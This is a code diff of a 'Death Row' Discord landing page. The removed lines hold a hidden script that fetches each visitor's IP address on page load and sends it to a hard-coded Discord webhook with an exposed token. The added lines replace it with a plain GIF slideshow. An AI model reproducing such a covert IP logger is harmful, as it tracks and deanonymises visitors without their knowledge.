@@ -3,186 +3,114 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Death Row</title>
-    <link rel="icon" href="ww.jpg" type="image/x-icon">
-    <link href="https://fonts.googleapis.com/css2?family=Pacifico&family=Metal+Mania&family=Gugi&display=swap" rel="stylesheet">
+    <title>Death Row Website</title>
     <style>
-        body, html {
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #000000; /* Black background */
+            color: #ffffff; /* White text color */
             margin: 0;
             padding: 0;
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-            background: #000;
-            color: #fff;
-            font-family: 'Pacifico', cursive;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
         }
-        .container {
-            position: relative;
-            width: 100%;
-            height: 100%;
+        .header, .footer {
+            font-family: 'Creepster', cursive; /* Bloody font */
         }
-        .slideshow {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-        }
-        .slideshow img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            position: absolute;
-            top: 0;
-            left: 0;
-            opacity: 0;
-            animation: slide 15s infinite;
-        }
-        .slideshow img:nth-child(1) {
-            animation-delay: 0s;
-        }
-        .slideshow img:nth-child(2) {
-            animation-delay: 5s;
-        }
-        .slideshow img:nth-child(3) {
-            animation-delay: 10s;
-        }
-        @keyframes slide {
-            0%, 20% { opacity: 1; }
-            33.33%, 100% { opacity: 0; }
-        }
-        .glitch {
+        .header {
             font-size: 3em;
-            position: absolute;
-            top: 40%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            animation: glitch 1s infinite;
+            margin-top: 20px;
+            color: #ff0000; /* Red color for a bloody effect */
         }
-        .glitch:before,
-        .glitch:after {
-            content: attr(data-text);
-            position: absolute;
-            left: 0;
-            width: 100%;
-            height: 100%;
+        .slideshow-container {
+            max-width: 800px;
+            position: relative;
         }
-        .glitch:before {
-            left: 2px;
-            text-shadow: -2px 0 red;
-            clip: rect(24px, 550px, 90px, 0);
-            animation: glitch 1s infinite linear alternate-reverse;
-        }
-        .glitch:after {
-            left: -2px;
-            text-shadow: -2px 0 blue;
-            clip: rect(85px, 550px, 140px, 0);
-            animation: glitch 1s infinite linear alternate-reverse;
-        }
-        @keyframes glitch {
-            0% { clip: rect(44px, 9999px, 56px, 0); transform: skew(0.3deg); }
-            5% { clip: rect(10px, 9999px, 83px, 0); transform: skew(0.3deg); }
-            10% { clip: rect(60px, 9999px, 100px, 0); transform: skew(0.3deg); }
-            15% { clip: rect(40px, 9999px, 90px, 0); transform: skew(0.3deg); }
-            20% { clip: rect(30px, 9999px, 120px, 0); transform: skew(0.3deg); }
-            25% { clip: rect(80px, 9999px, 150px, 0); transform: skew(0.3deg); }
-            30% { clip: rect(10px, 9999px, 190px, 0); transform: skew(0.3deg); }
-            35% { clip: rect(40px, 9999px, 220px, 0); transform: skew(0.3deg); }
-            40% { clip: rect(50px, 9999px, 250px, 0); transform: skew(0.3deg); }
-            45% { clip: rect(20px, 9999px, 280px, 0); transform: skew(0.3deg); }
-            50% { clip: rect(80px, 9999px, 320px, 0); transform: skew(0.3deg); }
-            55% { clip: rect(40px, 9999px, 350px, 0); transform: skew(0.3deg); }
-            60% { clip: rect(10px, 9999px, 390px, 0); transform: skew(0.3deg); }
-            65% { clip: rect(70px, 9999px, 420px, 0); transform: skew(0.3deg); }
-            70% { clip: rect(30px, 9999px, 450px, 0); transform: skew(0.3deg); }
-            75% { clip: rect(60px, 9999px, 490px, 0); transform: skew(0.3deg); }
-            80% { clip: rect(20px, 9999px, 520px, 0); transform: skew(0.3deg); }
-            85% { clip: rect(50px, 9999px, 550px, 0); transform: skew(0.3deg); }
-            90% { clip: rect(10px, 9999px, 590px, 0); transform: skew(0.3deg); }
-            95% { clip: rect(70px, 9999px, 620px, 0); transform: skew(0.3deg); }
-            100% { clip: rect(30px, 9999px, 650px, 0); transform: skew(0.3deg); }
-        }
-        .bloody {
-            font-family: 'Metal Mania', cursive;
-            color: red;
-            text-shadow: 2px 2px 8px #000;
-            font-size: 2em;
-            position: absolute;
-            top: 60%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-        }
-        .gangster {
-            font-family: 'Gugi', cursive;
-            color: #fff;
-            text-shadow: 2px 2px 8px #000;
-            font-size: 2em;
-            position: absolute;
-            top: 70%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-        }
-        .youtube-embed {
+        .mySlides {
             display: none;
         }
+        .slideshow-container img {
+            width: 100%;
+        }
+        .footer {
+            font-size: 1.5em;
+            margin-top: 20px;
+            width: 100%;
+            white-space: nowrap;
+            overflow: hidden;
+            position: fixed;
+            bottom: 10px;
+            left: 0;
+            color: #ffffff; /* White color for the footer text */
+        }
+        .footer span {
+            display: inline-block;
+            animation: bounce 4s infinite linear;
+        }
+        @keyframes bounce {
+            0% { transform: translateX(100%); }
+            50% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        .fade {
+            animation: fadeEffect 1.5s;
+        }
+        @keyframes fadeEffect {
+            from {opacity: .4} 
+            to {opacity: 1}
+        }
     </style>
+    <link href="https://fonts.googleapis.com/css2?family=Creepster&display=swap" rel="stylesheet">
+    <link rel="icon" href="path_to_your_favicon.ico" type="image/x-icon"> <!-- Favicon link -->
 </head>
 <body>
-    <iframe class="youtube-embed" width="560" height="315" src="https://www.youtube.com/embed/C55GhwwZmYY?autoplay=1&loop=1&playlist=C55GhwwZmYY" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
-    <div class="container">
-        <div class="slideshow">
-            <img src="https://cdn.discordapp.com/attachments/1247373671677563012/1256035523244589076/Screenshot_2024-06-28_023612.png" alt="صورة">
-            <img src="https://cdn.discordapp.com/attachments/1247373671677563012/1256040855274524843/4781be883ddf0a48a7ad066c51cc759a.png" alt="صورة 2">
-            <img src="https://cdn.discordapp.com/attachments/1247373671677563012/1256040999336284291/7b56790ca2c913b177b94f15f54b416b.png" alt="صورة 3">
+    <div class="slideshow-container">
+        <div class="mySlides fade">
+            <img src="1.gif" alt="GIF 1">
         </div>
-        <div class="bloody">Death Row .gg/?></div>
-        <div class="gangster">I'm still here, don't worry</div>
+        <div class="mySlides fade">
+            <img src="2.gif" alt="GIF 2">
+        </div>
+        <div class="mySlides fade">
+            <img src="3.gif" alt="GIF 3">
+        </div>
+        <div class="mySlides fade">
+            <img src="4.gif" alt="GIF 4">
+        </div>
+        <div class="mySlides fade">
+            <img src="5.gif" alt="GIF 5">
+        </div>
+        <div class="mySlides fade">
+            <img src="6.gif" alt="GIF 6">
+        </div>
+        <div class="mySlides fade">
+            <img src="7.gif" alt="GIF 7">
+        </div>
     </div>
-
+    <div class="header">
+        Discord.gg/499
+    </div>
+    <div class="footer">
+        <span>Death Row</span>
+    </div>
     <script>
-        document.addEventListener('DOMContentLoaded', () => {
-            fetch('https://api.ipify.org?format=json')
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Failed to fetch visitor IP');
-                    }
-                    return response.json();
-                })
-                .then(data => {
-                    const ip = data.ip;
+        let slideIndex = 0;
+        showSlides();
 
-                    const webhookUrl = 'https://canary.discord.com/api/webhooks/1256247502366314576/DgNOqdsKDTmfPmoCdccyAVvuTxcX6p9MqqOqGXSKh-wmISkUukuiiS62QRqWfD6i1le1';
-
-                    const embed = {
-                        title: '[New pie]',
-                        description: `ip: ${ip}`,
-                        color: 0x000000,
-                        image: {
-                            url: 'https://cdn.discordapp.com/attachments/1256064719610183730/1256064764040314971/6dc8de6c041a308977d506fde50e5da8.gif',
-                        },
-                    };
-
-                    const message = {
-                        embeds: [embed],
-                    };
-
-                    fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify(message),
-                    })
-                    .then(response => {
-                        if (!response.ok) {
-                            throw new Error('Failed to send IP address to Discord webhook');
-                        }
-                    })
-                    .catch(error => console.error('Error sending IP address to Discord webhook:', error));
-                })
-                .catch(error => console.error('Error fetching visitor IP:', error));
-        });
+        function showSlides() {
+            let slides = document.getElementsByClassName("mySlides");
+            for (let i = 0; i < slides.length; i++) {
+                slides[i].style.display = "none";  
+            }
+            slideIndex++;
+            if (slideIndex > slides.length) {slideIndex = 1}    
+            slides[slideIndex-1].style.display = "block";  
+            setTimeout(showSlides, 2000); // Change image every 2 seconds
+        }
     </script>
 </body>
 </html>
